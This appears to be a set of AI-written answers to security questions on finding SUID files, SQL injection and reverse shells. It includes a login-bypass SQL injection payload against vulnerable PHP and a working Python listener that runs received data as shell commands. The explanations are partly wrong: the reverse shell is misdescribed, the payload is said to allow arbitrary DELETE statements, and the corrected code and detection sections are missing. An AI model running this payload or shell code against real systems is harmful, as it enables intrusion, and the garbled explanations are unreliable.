# Question 5: On a Linux system, write a command to find all files with the SUID bit set. Explain why SUID files are a security concern.

## Thinking ...



---
## Content



```bash
find / -perm -4000 2>/dev/null
```

The SUID bit is used to allow a user to execute a file as if they were the owner of that file. This can be dangerous because it allows users to gain elevated privileges.

### Explanation

* `find / -perm -4000 2>/dev/null`

    * `/` is the root directory

    * `-perm` is a test for permissions

    * `-4000` is the SUID bit

    * `2>` redirects stderr to a file

* `find / -perm -4000 2>/dev/null` will find all files with the SUID bit set.

# Question 11: Explain how SQL injection works. Provide an example of vulnerable code (in any language), demonstrate the attack payload, and show the corrected version of the code.

## Thinking ...



---
## Content



### Answer

SQL Injection is a type of attack that allows an attacker to execute arbitrary SQL statements against a database. This can lead to everything from data loss to complete system takeover.

The most common way to perform this attack is by using a web application that uses user input to construct a query. The attacker will then use the input to inject malicious SQL code into the query, which will be executed on the database.

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysql_query($query);
```

The attacker can then use the following payload to execute arbitrary SQL code:

```php
username=admin&password=' OR '1'='1
```

This will result in the following query being executed on the database:

```sql
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
```

The attacker can then use this to execute any SQL code they want. For example, they could delete all of the data from the table:

```sql
DELETE FROM users
```

To prevent this type of attack, you should always validate user input and escape special characters before using it in a query.

# Question 13: Explain how a reverse shell works. Provide a working example in Python (both the listener side and the connecting side). Then explain how a security analyst would detect this activity in network logs and on the host.

### Answer

A reverse shell is a type of remote access technique that allows an attacker to gain control over a system, usually by using an existing connection. A reverse shell is different from other types of remote access techniques because it uses an existing connection instead of creating a new one.

The following diagram shows how a reverse shell works:

![Reverse Shell](https://i.imgur.com/5190vYs.png)

In the above diagram, the attacker connects to the victim's machine using an existing connection. The attacker then uses the existing connection to establish a new connection back to the attacker's machine. This is known as a reverse shell.

The following Python code snippet shows how a reverse shell works:

```python
#!/usr/bin/env python3
import socket, subprocess, os

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ('localhost', 10000)
print('starting up on {} port {}'.format(*server_address))
sock.bind(server_address)

# Listen for incoming connections
sock.listen(1)

while True:
    # Wait for a connection
    print('waiting for a connection')
    connection, client_address = sock.accept()
    try:
        print('connection from', client_address)

        # Receive the banner
        connection.sendall(b'Banner goes here\n')
        data = connection.recv(1024)

        # Execute the command
        p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=connection)
        result = p.communicate()[0]

        # Send back the result
        connection.sendall(result)
    finally:
        connection.close()
```

sock.connect(server_address)
